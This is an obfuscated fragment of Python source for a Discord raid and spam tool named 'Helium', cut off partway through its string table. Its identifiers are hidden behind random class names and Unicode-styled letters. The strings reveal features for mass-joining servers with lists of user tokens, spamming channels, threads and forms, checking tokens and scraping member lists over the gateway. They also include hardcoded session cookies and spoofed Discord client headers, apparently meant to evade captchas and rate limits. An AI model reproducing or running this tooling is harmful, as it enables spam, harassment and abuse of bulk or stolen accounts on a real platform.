class JEsC38pGjgJYP5BzVTcYH7vF2Gnj0MST(𝘪𝘯𝙩):...

class s_85qXdnSNQJFXy5GaSaL00_8BwSQ382(𝘀𝘵𝙧):...

class E83xqdU5oDpOqsHZ1c_VIUeSzllnZi0M(𝘀𝙩𝗿):...

class ccKm7rXwS7ak6MDjiBM1oMPYeChNlmBI(𝘪𝙣𝘵):...

class yN6VK95WFtQV2qFJn8WWRPxhOE8hi1XA(𝗶𝙣𝘵):...

class irpI_zH3N1k9GuvVo2iSBSOXzlsC8iTK(𝘪𝗻𝙩):...

class hvVwb5oPzXljtS5jsKI14ZaeqFgRazDX(𝙞𝗻𝘵):...

class Mvd3AKwS4271MWpgpXUCnrflWIQNOSZn(𝘪𝘯𝙩):...

class agwIcZkc6EJ2kb_Ue7mQcJlNz5Cr3NGO(𝙛𝙡𝙤𝗮𝘁):...

class HJ8rQyf9ivIn715_lhtaC96BZLzqqFoV(𝙛𝙡𝘰𝘢𝘵):...

class OmVOOjsYd8gV8E7DkW3zRqSIlDXZzIuJ(𝗶𝗻𝘁):...

class extm_a_8wpaFshi49egI70VJxf5Pzfcf(𝘑𝗘𝘀𝘊38𝙥𝘎𝗷𝗴𝘑𝙔𝗣5𝘉𝘻𝘝𝗧𝘤𝗬𝙃7𝙫𝙁2𝘎𝙣𝘫0𝙈𝙎𝘛):...

class HxW8EmReskpcFTKPZztM_sJTv6LvCMZf(𝘴_85𝗾𝗫𝘥𝗻𝘚𝙉𝙌𝘑𝙁𝙓𝙮5𝗚𝗮𝗦𝘢𝙇00_8𝘽𝘸𝘚𝗤382):...

class P2OrGGe_Flkpjlg5TbJIwU6ou_1FkqMg(𝗘83𝘹𝗾𝗱𝙐5𝘰𝘋𝘱𝘖𝗾𝘴𝙃𝙕1𝘤_𝙑𝙄𝙐𝘦𝙎𝙯𝘭𝙡𝗻𝘡𝙞0𝗠):...

class jwKjFYnsXeg0hKlGsq8osH5lfxlaqSqh(𝙘𝙘𝙆𝗺7𝗿𝙓𝙬𝙎7𝙖𝗸6𝗠𝗗𝙟𝗶𝘉𝗠1𝙤𝙈𝘗𝘠𝙚𝗖𝗵𝙉𝙡𝘮𝘽𝙄):...

class jobKk8z2TxM_YQMzG_NG33iwlCmFYWBn(𝘆𝙉6𝙑𝗞95𝗪𝗙𝘵𝙌𝙑2𝘲𝗙𝘑𝙣8𝘞𝙒𝘙𝗣𝘹𝘩𝘖𝗘8𝘩𝗶1𝙓𝘈):...

class qmZgvt5h5JftV0nxXCF8VdydUz9YdNek(𝘪𝗿𝗽𝗜_𝘇𝘏3𝘕1𝗸9𝙂𝘂𝙫𝙑𝘰2𝙞𝗦𝘽𝙎𝙊𝗫𝘻𝗹𝙨𝘊8𝗶𝗧𝗞):...

class crCBRNPZZGKfd63Hiyfo6AuuJU96k5c_(𝙝𝘷𝙑𝘄𝘣5𝙤𝙋𝘻𝙓𝙡𝗷𝘁𝗦5𝗷𝙨𝘒𝗜14𝘡𝙖𝙚𝙦𝙁𝘨𝘙𝙖𝘇𝘋𝙓):...

class xzK20OWfhzGHpx3TLBU2y7jDX0QX6Tw0(𝙈𝘷𝗱3𝘈𝘒𝘸𝙎4271𝘔𝘞𝙥𝙜𝗽𝘟𝗨𝗖𝘯𝗿𝗳𝗹𝙒𝘐𝙌𝗡𝙊𝙎𝗭𝗻):...

class pqVnH6vFmnX6ESj7e5ANzEQCjQDa_uQK(𝗮𝘨𝙬𝙄𝙘𝘡𝙠𝙘6𝙀𝙅2𝙠𝗯_𝘜𝙚7𝙢𝗤𝗰𝗝𝙡𝗡𝘻5𝗖𝘳3𝘕𝗚𝙊):...

class HJNhgz1pgTVHVrZeOnKjo9Cbiqqwng6i(𝗛𝘑8𝗿𝙌𝙮𝗳9𝘪𝙫𝗜𝗻715_𝘭𝗵𝙩𝙖𝘾96𝘽𝘡𝘓𝘻𝗾𝗾𝙁𝗼𝙑):...

class KHfyD3A9FbP6ZcD9XFbddwtA6ESl5C9B(𝗢𝙢𝗩𝙊𝙊𝙟𝙨𝙔𝙙8𝘨𝗩8𝙀7𝘿𝘬𝙒3𝘻𝙍𝙦𝗦𝗜𝙡𝘿𝗫𝙕𝘇𝙄𝘶𝗝):...

class wBwWqRAdxVj0I2eHSDJGXfDoRgx0TyOQ(𝙚𝙭𝘵𝙢_𝙖_8𝘄𝙥𝗮𝘍𝙨𝙝𝗶49𝘦𝘨𝘐70𝘝𝘑𝘅𝗳5𝘗𝙯𝘧𝘤𝙛):...

class qq6OBo_o27pJsUz4QoPimYpflKo4krKP(𝙃𝙭𝘞8𝙀𝘮𝗥𝘦𝘀𝙠𝙥𝘤𝗙𝗧𝘒𝘗𝙕𝘻𝙩𝗠_𝘀𝘑𝗧𝙫6𝗟𝘷𝗖𝙈𝙕𝙛):...

class vNWfh1d94rFEg8jgwFABDB1W6bNXNuXY(𝘗2𝗢𝘳𝘎𝗚𝘦_𝘍𝘭𝗸𝙥𝙟𝘭𝙜5𝙏𝗯𝙅𝘐𝘄𝙐6𝙤𝘶_1𝙁𝗸𝙦𝙈𝙜):...

class yreJBcCSiW6loV2wPcCzqY7piNHM3ucY(𝘫𝙬𝘒𝗷𝙁𝘠𝘯𝘴𝗫𝘦𝘨0𝘩𝘒𝗹𝙂𝘀𝘲8𝘰𝘴𝘏5𝗹𝘧𝘅𝘭𝘢𝗾𝘚𝘲𝙝):...

class puC17V7GCL_ksHvtN62_9ipH5jf19Dz2(𝙟𝙤𝘣𝗞𝘬8𝘻2𝙏𝙭𝗠_𝗬𝗤𝙈𝙯𝙂_𝘕𝙂33𝗶𝘄𝙡𝘊𝘮𝗙𝙔𝗪𝘽𝙣):...

class ASYJ11h45p5wai2e8phRZkjZmci69GB4(𝗾𝗺𝘡𝘨𝙫𝙩5𝙝5𝗝𝗳𝘵𝙑0𝘯𝘅𝘟𝗖𝘍8𝗩𝙙𝙮𝘥𝘜𝙯9𝘠𝗱𝗡𝙚𝘬):...

class jsOKN9c3No8xIZY7UDTMk1rrm0Smawyc(𝙘𝗿𝘾𝗕𝘙𝙉𝘗𝘡𝙕𝗚𝘒𝙛𝗱63𝗛𝙞𝘆𝘧𝗼6𝗔𝘂𝘶𝗝𝗨96𝘬5𝗰_):...

class hTieR7Q99B28J5VhcSiTMJkttXBWgtui(𝘅𝘻𝙆20𝙊𝗪𝗳𝙝𝘇𝘎𝘏𝗽𝘹3𝗧𝙇𝘉𝗨2𝙮7𝙟𝘿𝘟0𝗤𝙓6𝙏𝘸0):...

class j6Uh6P4OiGDi4ludw8bEzQVilGlN1A_J(𝘱𝗾𝗩𝗻𝘏6𝙫𝙁𝙢𝗻𝗫6𝘌𝘚𝘫7𝘦5𝘼𝙉𝙯𝗘𝙌𝗖𝘫𝗤𝘿𝘢_𝘶𝘘𝙆):...

class XFcONVXjuThhUUAWY2pskBtZAn_8oYk6(𝘏𝙅𝗡𝙝𝗴𝘻1𝗽𝘨𝘛𝙑𝘏𝙑𝘳𝗭𝙚𝗢𝙣𝙆𝗷𝘰9𝘊𝙗𝙞𝙦𝘲𝘸𝙣𝙜6𝙞):...

class fwEshK0TVjUBWEQ0VFADmBykNl84CTK9(𝘒𝘏𝙛𝙮𝘋3𝗔9𝗙𝙗𝗣6𝗭𝙘𝗗9𝗫𝙁𝘣𝘥𝙙𝙬𝘁𝘈6𝘌𝙎𝘭5𝗖9𝘽):...

class SySrXgBLzJkU4l86QWPHiH4oXhekoyJ4(𝘸𝗕𝙬𝘞𝗾𝗥𝘼𝘥𝘅𝘝𝙟0𝗜2𝘦𝗛𝙎𝘿𝙅𝘎𝘟𝗳𝗗𝗼𝙍𝗴𝘅0𝘛𝘆𝘖𝘘):...

class WeBCS0MtRKW0nxu2w3TAk6wlC1Gp3wYE(𝙦𝘲6𝘖𝗕𝘰_𝘰27𝗽𝙅𝘴𝗨𝘇4𝘘𝗼𝗣𝗶𝘮𝘠𝗽𝗳𝗹𝗞𝙤4𝙠𝗿𝘒𝗣):...

class MlAH2wcTgRALYhmpTydpKexPigK_kHnr(𝘃𝙉𝙒𝗳𝘩1𝙙94𝗿𝙁𝙀𝗴8𝗷𝗴𝙬𝙁𝗔𝗕𝘿𝘉1𝗪6𝗯𝗡𝙓𝗡𝙪𝗫𝗬):...

class NP6FIZdEsguhyetKxH1sAHVqJm68oJby(𝘆𝙧𝙚𝙅𝘽𝗰𝘾𝘚𝗶𝘞6𝘭𝘰𝗩2𝘄𝘗𝘤𝘾𝙯𝘲𝗬7𝙥𝘪𝘕𝘏𝘔3𝘂𝘤𝙔):...

class fqxDL6M9LvPrfkfVS8jt5zEay4z_g7Pn(𝙥𝘶𝘾17𝙑7𝗚𝗖𝗟_𝗸𝙨𝙃𝙫𝙩𝗡62_9𝘪𝘱𝘏5𝙟𝘧19𝘿𝘻2):...

class DrmTGirWcfgwOBmb4jrHd6GVRLKCCBJl(𝘈𝙎𝙔𝙅11𝗵45𝙥5𝘄𝙖𝘪2𝘦8𝘱𝙝𝘙𝗭𝗸𝘫𝗭𝙢𝘤𝗶69𝘎𝗕4):...

class sAvV324z4TNLCzC_IfVTX31sIFU9hLP9(𝙟𝘴𝙊𝘒𝗡9𝗰3𝗡𝗼8𝘹𝘐𝗭𝙔7𝙐𝗗𝙏𝗠𝘬1𝙧𝙧𝘮0𝘚𝙢𝗮𝘸𝘆𝙘):...

class BJsWIkHYupR7Qe_vBB5eC55P71HYtG2u(𝗵𝘛𝙞𝗲𝙍7𝘘99𝘽28𝙅5𝘝𝗵𝙘𝘚𝘪𝘛𝙈𝙅𝘬𝘵𝘵𝘟𝗕𝙒𝙜𝘁𝘶𝘪):...

class ngvTdqLARkj6t4A_HiqTkHiDddYl8Q9E(𝘫6𝘜𝙝6𝙋4𝙊𝗶𝙂𝗗𝙞4𝘭𝘂𝘥𝘸8𝙗𝗘𝙯𝙌𝙑𝘪𝙡𝗚𝗹𝙉1𝘼_𝘑):...

class mNtEFXgndyEGVfAhfCicB1nhnbknRvIN(𝙓𝗙𝙘𝗢𝙉𝘝𝘟𝘫𝘂𝗧𝗵𝙝𝗨𝘜𝗔𝙒𝗬2𝙥𝘴𝙠𝘽𝙩𝙕𝘼𝗻_8𝙤𝘠𝗸6):...

class XQgHd2zTH_0LdmUS30ppedL1xU2APFZm(𝘧𝘸𝗘𝙨𝘩𝙆0𝗧𝘝𝙟𝗨𝘉𝙒𝙀𝗤0𝗩𝘍𝘼𝘋𝘮𝘽𝙮𝙠𝘕𝘭84𝘊𝘛𝗞9):...

class fWmIhaChHxyV6Sy7lxixL9zW36SSAAV3(𝘚𝘆𝘚𝙧𝙓𝘨𝘽𝙇𝘻𝘑𝗸𝙐4𝙡86𝙌𝙒𝗣𝗛𝙞𝙃4𝙤𝗫𝗵𝗲𝗸𝗼𝙮𝗝4):...

class H3ka5oNr1XYUuIEeWsJPpnNBOWNS7vg9(𝗪𝘦𝗕𝘊𝙎0𝙈𝘵𝘙𝘒𝙒0𝘯𝘹𝘂2𝙬3𝗧𝗔𝗸6𝘸𝙡𝗖1𝘎𝙥3𝙬𝙔𝗘):...

class NLwnEbktqbQZlpeGBgob2IMQhcikV8WF(𝙈𝙡𝗔𝙃2𝘄𝙘𝙏𝙜𝘙𝘈𝘓𝗬𝗵𝙢𝘱𝘛𝘆𝘥𝙥𝙆𝘦𝙭𝙋𝗶𝗴𝘒_𝗸𝗛𝗻𝗿):...

class yeruUjKiF3M4TznkbgROL9xhI9uTYI4h(𝗡𝙋6𝗙𝘐𝙕𝘥𝘌𝘀𝘨𝙪𝘩𝙮𝙚𝙩𝗞𝘅𝙃1𝘀𝘼𝘏𝗩𝘲𝘑𝘮68𝗼𝙅𝙗𝙮):...

class FGC5dYW0xiIZtaDCEChXNQ4hQxNxNLVW(𝙛𝘲𝘹𝘋𝗟6𝘔9𝙇𝘃𝘗𝙧𝗳𝗸𝙛𝘝𝗦8𝗷𝘵5𝘇𝙀𝗮𝘺4𝘻_𝗴7𝙋𝗻):...

class KlR6VzIyNAm42e66zZ1SG3U6QXsMeEix(𝘋𝙧𝙢𝙏𝙂𝘪𝙧𝙒𝙘𝙛𝗴𝙬𝗢𝘉𝗺𝘣4𝙟𝙧𝗛𝘥6𝙂𝙑𝙍𝙇𝙆𝘊𝘊𝘽𝘑𝗹):...

class DQiPOKm9u9HtaLcvxmUzX_qySbFI6cTJ(𝘴𝗔𝘷𝙑324𝙯4𝘛𝘕𝙇𝘊𝘇𝘊_𝘐𝙛𝙑𝙏𝗫31𝘀𝘐𝘍𝘜9𝙝𝗟𝙋9):...

class eorLsawCNWDK4MRi4sCARQl6XxNJE2rm(𝘉𝙅𝙨𝙒𝗜𝗸𝘏𝙔𝙪𝙥𝘙7𝗤𝙚_𝘷𝘉𝘉5𝙚𝘊55𝙋71𝙃𝘠𝘵𝙂2𝘂):...

class WDuNspBscJwfMBKbCIRQop60j7ArZfKH(𝘯𝙜𝙫𝙏𝗱𝘲𝘓𝘈𝙍𝙠𝘫6𝙩4𝘼_𝗛𝗶𝗾𝗧𝗸𝘏𝗶𝘋𝘥𝗱𝘠𝘭8𝙌9𝗘):...

class rJjVsZjl1L3KjmsfeuEpg2z4mEKiUxYN(𝗺𝘕𝙩𝙀𝘍𝗫𝗴𝙣𝙙𝘺𝗘𝗚𝗩𝙛𝘼𝘩𝙛𝗖𝙞𝘤𝗕1𝙣𝘩𝗻𝘣𝗸𝗻𝙍𝘃𝗜𝗡):...

class r_f4hgtqzqK401Y3thUN7VZcr5X0XTRe(𝙓𝙌𝗴𝙃𝗱2𝙯𝘛𝗛_0𝗟𝙙𝘮𝙐𝘚30𝗽𝗽𝙚𝗱𝘓1𝘅𝗨2𝗔𝗣𝙁𝗭𝗺):...

class oGDRzeBFT6fUia5TIDtB0d6OqKUrFAGy(𝘧𝙒𝙢𝗜𝘩𝗮𝘊𝙝𝘏𝙭𝙮𝘝6𝘚𝘆7𝙡𝘹𝗶𝘹𝙇9𝘻𝘞36𝙎𝗦𝘼𝗔𝗩3):...

class fIzv9s6BE9sZ3wZA0hi2wi5L8a790J6d(𝙃3𝗸𝙖5𝙤𝘕𝘳1𝘟𝙔𝗨𝙪𝗜𝗘𝘦𝗪𝘴𝙅𝗣𝗽𝘯𝙉𝘉𝗢𝘞𝘕𝙎7𝘃𝘨9):...

class NtxjCz8PAlX7nOYFvfHl1luBjhiGAiUC(𝗡𝙇𝘸𝙣𝙀𝘣𝘬𝙩𝘲𝘣𝙌𝗭𝙡𝘱𝗲𝗚𝘉𝗴𝗼𝗯2𝗜𝗠𝙌𝗵𝘤𝗶𝘬𝘝8𝘞𝘍):...

class eudRIfytw0VJ3DnLRjJHyrrQqyrzTJmu(𝘺𝗲𝙧𝘶𝗨𝙟𝘒𝙞𝘍3𝘔4𝗧𝙯𝘯𝗸𝙗𝘨𝘙𝗢𝘓9𝘅𝗵𝙄9𝘶𝗧𝘠𝘐4𝗵):...

class COexj45uAtjnhrmkvigjhLetY9FvQh8C(𝗞𝙡𝘙6𝙑𝙯𝙄𝘺𝙉𝘼𝘮42𝗲66𝘻𝗭1𝙎𝗚3𝙐6𝗤𝗫𝘀𝗠𝗲𝙀𝗶𝘅):...

class sg_D_mEcLwtd3yeNKRX2hyWbWjoul0J0(𝘿𝗤𝗶𝗣𝘖𝘒𝙢9𝘂9𝙃𝙩𝗮𝘓𝙘𝘷𝘅𝙢𝘜𝘻𝙓_𝘲𝘆𝘚𝘣𝙁𝗜6𝙘𝘛𝙅):...

class jg27dV6Tk36WVyFRruCXpoe9LISAXs1i(𝗲𝗼𝘳𝗟𝙨𝙖𝘄𝘊𝙉𝙒𝘋𝘒4𝘔𝘙𝘪4𝙨𝗖𝗔𝙍𝗤𝗹6𝘟𝘹𝘕𝙅𝗘2𝗿𝘮):...

class pjxy6VIVwIYEtRc8KELzmjitbLOL2YYZ(𝘞𝘋𝘶𝗡𝘴𝙥𝘽𝘀𝙘𝘑𝘸𝙛𝗠𝘽𝗞𝙗𝘊𝗜𝙍𝗤𝗼𝘱60𝙟7𝘼𝙧𝘡𝘧𝘒𝗛):...

class am2HL3S7YmH6UaUtWrrHS1WEgJB3C1OB(𝗿𝙅𝘫𝙑𝘴𝘡𝗷𝙡1𝗟3𝗞𝘫𝙢𝙨𝙛𝙚𝙪𝗘𝙥𝙜2𝙯4𝙢𝙀𝘒𝙞𝘜𝘹𝘠𝘕):...

class jFpOvI3IxWidlsvupWsAdBArRJVB2fAx(𝗿_𝙛4𝘩𝙜𝙩𝙦𝘇𝗾𝙆401𝗬3𝙩𝘩𝘜𝘕7𝙑𝗭𝘤𝘳5𝗫0𝙓𝗧𝙍𝙚):...

class WYIFt0bygAeULxGRpIJuhmf8wT8Q98OR(𝘦𝘶𝗱𝘙𝙄𝙛𝙮𝘵𝘸0𝗩𝗝3𝘋𝙣𝗟𝘙𝙟𝗝𝗛𝘆𝙧𝙧𝙌𝙦𝘺𝗿𝘇𝙏𝘑𝙢𝘂):...

class _MWuXh0pCsaHP2BGJ6copKRhBkc35K5D(𝘊𝘖𝗲𝙭𝘫45𝘶𝘈𝙩𝗷𝘯𝙝𝙧𝙢𝙠𝙫𝘪𝙜𝘫𝘩𝘓𝗲𝘁𝙔9𝘍𝙫𝘘𝙝8𝘊):...

class zX9GEfPwzgUVQv5xOkoy7xTxzRbhLu_I(𝙨𝙜_𝘋_𝘮𝘌𝘤𝗟𝘸𝘁𝙙3𝘺𝙚𝘕𝙆𝙍𝙓2𝗵𝘆𝗪𝙗𝗪𝗷𝙤𝘂𝙡0𝙅0):...

class w37d6m66wQm_QfSBUNu_L1FazBCuJhNF(𝗷𝙜27𝗱𝙑6𝗧𝘬36𝘞𝘝𝘆𝗙𝙍𝘳𝙪𝗖𝙓𝙥𝙤𝘦9𝘓𝗜𝘚𝘈𝗫𝘀1𝙞):...

class mMQBQtWPkkWO1QWETIDwXxujyKt_HLDu(𝘱𝘫𝘹𝙮6𝙑𝘐𝘝𝘄𝗜𝗬𝙀𝘵𝗥𝘤8𝙆𝙀𝘓𝘻𝙢𝙟𝘪𝙩𝘣𝗟𝙊𝙇2𝘠𝙔𝗭):...

class zG3a0WKQqZsrw3nYQQUm2uTmMlfjXMV3(𝗮𝙢2𝙃𝙇3𝗦7𝗬𝘮𝗛6𝘜𝗮𝗨𝙩𝘞𝗿𝙧𝗛𝘚1𝘞𝗘𝙜𝘑𝘽3𝗖1𝘖𝗕):...

class K6lEsSuqMgMKDxIOVgFthEGRqYK5OPNw(𝙟𝗙𝘱𝙊𝙫𝗜3𝘐𝘅𝗪𝘪𝘥𝗹𝘀𝘷𝘂𝙥𝙒𝘀𝘼𝙙𝘽𝗔𝗿𝙍𝙅𝘝𝘽2𝘧𝗔𝘅):...

class j3G66jVhLmVJiBRcxElacbNRNQuxDL4n(𝙒𝗬𝙄𝗙𝙩0𝘣𝘆𝗴𝘼𝘦𝙐𝘓𝘹𝙂𝗥𝙥𝘐𝙅𝘂𝗵𝙢𝗳8𝙬𝗧8𝘘98𝗢𝗥):...

class ybUfOcL39DuOnf_uQtEabTmVcTyMk08w(_𝙈𝙒𝘂𝗫𝙝0𝗽𝘊𝘀𝘢𝗛𝗣2𝗕𝗚𝘑6𝘤𝘰𝗽𝗞𝙍𝙝𝗕𝗸𝙘35𝗞5𝘋):...

class b4IsOhgA_o_KpbTWt_fWtDKnGW2XdeWd(𝙯𝙓9𝘎𝗘𝙛𝘗𝙬𝘻𝗴𝗨𝘝𝙌𝘷5𝙭𝗢𝘬𝘰𝙮7𝘅𝙏𝙭𝘇𝙍𝗯𝙝𝘓𝙪_𝘐):...

class F8svkQR24S3nqH6RXJTWvU7Su47OIjun(𝗺𝗠𝘘𝘽𝗤𝘵𝙒𝗣𝙠𝙠𝘞𝗢1𝗤𝗪𝘌𝗧𝘐𝘿𝙬𝘟𝘅𝘂𝘫𝘆𝙆𝘁_𝗛𝙇𝘿𝘶):...

class kxtUSnoZJnXVJ3oIKNCYBOLBx7gMKWUp(𝘇𝘎3𝘢0𝙒𝗞𝙌𝙦𝙕𝘀𝙧𝘸3𝗻𝗬𝘘𝙌𝘜𝘮2𝙪𝙏𝘮𝘔𝗹𝙛𝙟𝘟𝗠𝙑3):...

class A2gVG4_4wvWFgXqeo_GIgRTZdEiD7sAW(𝘒6𝗹𝗘𝘴𝗦𝘂𝗾𝘔𝗴𝘔𝘒𝘋𝙭𝙄𝗢𝗩𝘨𝘍𝘁𝙝𝗘𝗚𝗥𝗾𝗬𝙆5𝙊𝗣𝘕𝙬):...

class wuC8bzn9lq9CKBEPKlokTYI9DD1SeNfh(𝙟3𝗚66𝘫𝘝𝗵𝘓𝘮𝘝𝗝𝙞𝘽𝗥𝘤𝘅𝗘𝙡𝘢𝗰𝗯𝙉𝙍𝘕𝘘𝘂𝘅𝘿𝗟4𝗻):...

class qU4IZNkJpeABZdEuZ0UjzkiTndlFszwf(𝙗4𝘐𝘴𝙊𝙝𝘨𝘈_𝗼_𝙆𝗽𝘣𝗧𝘞𝙩_𝙛𝙒𝙩𝘋𝘒𝘯𝙂𝗪2𝙓𝘥𝗲𝘞𝘥):...

class SowE5JS3pDJGMlKcZgh7YzohU4W_qGIN(𝗸𝘹𝘵𝘜𝙎𝗻𝘰𝗭𝗝𝘯𝙓𝘝𝘑3𝗼𝗜𝙆𝗡𝘾𝙔𝘽𝙊𝙇𝘽𝘹7𝗴𝘔𝙆𝗪𝙐𝘱):...

class Nt1cC4KA3XBPzGY62WRKnEiEhzriN2nr(𝘼2𝙜𝙑𝘎4_4𝘸𝙫𝙒𝘍𝙜𝘟𝗾𝗲𝙤_𝗚𝘐𝘨𝙍𝙏𝘡𝙙𝙀𝙞𝘋7𝘴𝘈𝙒):...

class BD0h8R01U3Uzg9S_zBJAtiwU0ZAg2usD(𝘲𝙐4𝘐𝘡𝙉𝘬𝙅𝘱𝙚𝘈𝘉𝙕𝙙𝗘𝘶𝘡0𝘜𝗷𝘇𝗸𝘪𝘛𝙣𝙙𝙡𝘍𝘴𝘇𝙬𝗳):...
𝗜𝙉𝙄𝙉𝙡𝙡𝙄𝗠𝙄𝙄𝘭𝗠𝗹𝗹𝘐𝘭𝗹𝙉𝙉𝙄𝗹𝙡𝗠𝙉𝗹𝗡𝘭𝙈𝘐𝗠𝘐𝗠 = ['title Helium - starting up', 'cls', 'pip install colorama > nul', 'pip install os.path > nul', 'pip install pathlib > nul', 'pip install threading > nul', 'pip install websocket > nul', 'pip install websocket_client > nul', 'pip install tls_client > nul', 'pip install requests > nul', 'pip install datetime > nul', 'pip install emoji > nul', 'pip install base64 > nul', 'pip install uuid > nul', 'pip install time > nul', 'pip install subprocess > nul', 'pip install hashlib > nul', 'data', 'avatars', 'title Helium - First Time Install', 'tokens.txt', 'w', '', 'proxies.txt', 'members.txt', 'config.json', '{"proxy": false, "rgb": [255, 130, 0]}', 'utf8', 'proxies', 'data/proxies.txt', 'r', 'chrome_116', '     \n                                  ██', '╗  ', '██', '╗', '███████', '╗     ', '╗   ', '███', '╗\n                                  ', '║  ', '║', '╔════╝', '║     ', '║   ', '████', '╗ ', '\n                                  ███████', '█████', '╔', '\n                                  ██', '╔══', '╔══╝  ', '║╚', '╔╝', '██████', '║ ╚═╝ ', '║\n                                  ╚═╝  ╚═╝╚══════╝╚══════╝╚═╝ ╚═════╝ ╚═╝     ╚═╝', 'data/tokens.txt', '╚', '╝', '═', '\n', '██╗  ██╗███████╗██╗     ██╗██╗   ██╗███╗   ███╗', '██║  ██║██╔════╝██║     ██║██║   ██║████╗ ████║', '███████║█████╗  ██║     ██║██║   ██║██╔████╔██║', '██╔══██║██╔══╝  ██║     ██║██║   ██║██║╚██╔╝██║', '██║  ██║███████╗███████╗██║╚██████╔╝██║ ╚═╝ ██║', '╚═╝  ╚═╝╚══════╝╚══════╝╚═╝ ╚═════╝ ╚═╝     ╚═╝', '\n\n', '                      ', ' Loaded ‹', '› tokens | Loaded ‹', '> proxies', '»', '«', '─', '╭', '│', '╰', '╯', '╮', '╭─────────────────────────────────────────────────────────────────────────────────────────────╮', '│ «01» Joiner            «06» Token Formatter    «11» Onliner          «16» ???               │', '│ «02» Leaver            «07» Button Click       «12» Voice Joiner     «17» ???               │', '│ «03» Spammer           «08» Accept Rules       «13» Change Nick      «18» ???               │', '│ «04» Token Checker     «09» Guild Check        «14» Thread Spammer   «19» ???               │', '│ «05» Reactor           «10» Bio Changer        «15» Forms Spammer    «20» Exit              │', '╰─────────────────────────────────────────────────────────────────────────────────────────────╯', 'title Helium', '[', '%H:%M:%S', '] ', ' (', ')', '? ', '(y/n)', ' ', ']: ', 'https://discord.com', '; ', '=', '__dcfduid=5e271e90481111eea67b61f9ac35724f; __sdcfduid=5e271e91481111eea67b61f9ac35724fbc3b6eb338d8f68fc5c82cf05c36e65b4ab6e19dd28c901f1e5e6236f69238a5; __cfruid=376f640a0e40236d1f38bc93ea51e6f430ae37e8-1693494992; _cfuvid=nQDMUQwYTyGceEcJFREhptuDgpRwpQYaeQ7UXlggUto-1693494992639-0-604800000', '(ERR): ', ' (get_discord_cookies)', 'os', 'browser', 'release_channel', 'client_version', 'os_version', 'os_arch', 'system_locale', 'browser_user_agent', 'browser_version', 'client_build_number', 'native_build_number', 'client_event_source', 'Windows', 'Discord Client', 'stable', '1.0.9017', '10.0.19045', 'x64', 'en', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9016 Chromium/108.0.5359.215 Electron/22.3.12', '22.3.12', 'authority', 'accept', 'accept-language', 'authorization', 'cookie', 'content-type', 'user-agent', 'x-discord-locale', 'x-super-properties', 'discord.com', '*/*', 'application/json', 'en-US', 'title Helium - Joiner', 'session_id', 'https://discord.com/api/v9/invites/', 'JOINED', ' (.gg/', 'CAPTCHA', 'RATELIMITED', 'FAILED', 'message', 'ERROR', ' (joiner)', 'title Helium - Leaver', 'https://discord.com/api/v9/guilds/', 'name', 'lurking', 'https://discord.com/api/v9/users/@me/guilds/', 'LEFT', ']', 'online_count', 'member_count', 'id', 'guild_id', 'hoisted_roles', 'types', 'locations', 'updates', 'd', 'groups', 'ops', 'op', 'SYNC', 'INVALIDATE', 'range', 'items', 'INSERT', 'UPDATE', 'DELETE', 'index', 'item', 'Accept-Encoding', 'Accept-Language', 'Cache-Control', 'Pragma', 'Sec-WebSocket-Extensions', 'User-Agent', 'gzip, deflate, br', 'en-US,en;q=0.9', 'no-cache', 'permessage-deflate; client_max_window_bits', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 OPR/101.0.0.0', 'wss://gateway.discord.gg/?encoding=json&v=9', '{"op":14,"d":{"guild_id":"', '","typing":true,"activities":true,"threads":true,"channels":{"', '":', '}}}', '{"op":2,"d":{"token":"', '","capabilities":125,"properties":{"os":"Windows NT","browser":"Chrome","device":"","system_locale":"it-IT","browser_user_agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36","browser_version":"116.0","os_version":"10","referrer":"","referring_domain":"","referrer_current":"","referring_domain_current":"","release_channel":"stable","client_build_number":103981,"client_event_source":null},"presence":{"status":"online","since":0,"activities":[],"afk":false},"compress":false,"client_state":{"guild_hashes":{},"highest_last_message_id":"0","read_state_version":0,"user_guild_settings_version":-1,"user_settings_version":-1}}}', '{"op":1,"d":', '}', 'heartbeat_interval', 't', 'READY', 'guilds', 'READY_SUPPLEMENTAL', 'GUILD_MEMBER_LIST_UPDATE', 'member', 'tag', 'user', 'username', '#', 'discriminator', 'bot', 'data/members.txt', 'w+', 'no valid tokens in guild', 'a+', ' -  || <@!', '> |||| <@!', '> ||', 'Authorization', 'content-length', 'origin', 'sec-ch-ua', 'sec-ch-ua-mobile', 'sec-ch-ua-platform', 'sec-fetch-dest', 'sec-fetch-mode', 'sec-fetch-site', 'x-debug-options', 'x-discord-timezone', 'pl', '0', '__dcfduid=4e0a8d504a4411eeb88f7f88fbb5d20a; __sdcfduid=4e0a8d514a4411eeb88f7f88fbb5d20ac488cd4896dae6574aaa7fbfb35f5b22b405bbd931fdcb72c21f85b263f61400; __stripe_mid=95b0994a-5555-4ae2-a529-19de05e8a84261fc41; cf_clearance=ipf6ofbR8N9QZhQ1Oo0kyIrHeAY3IaG.fFDwKzznKCI-1694246626-0-1-a544f47e.ac16d7c4.fcbd86dd-0.2.1694246626; __cfruid=af646639dffe9110a3a9de9f0e1ebd2752a01153-1694278928; __stripe_sid=e54ed780-00b5-44d5-a066-1ea1092a1644ec258f', '"Not?A_Brand";v="8", "Chromium";v="108"', '?0', '"Windows"', 'empty', 'cors', 'same-origin', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9017 Chrome/108.0.5359.215 Electron/22.3.12 Safari/537.36', 'bugReporterEnabled', 'Europe/Warsaw', 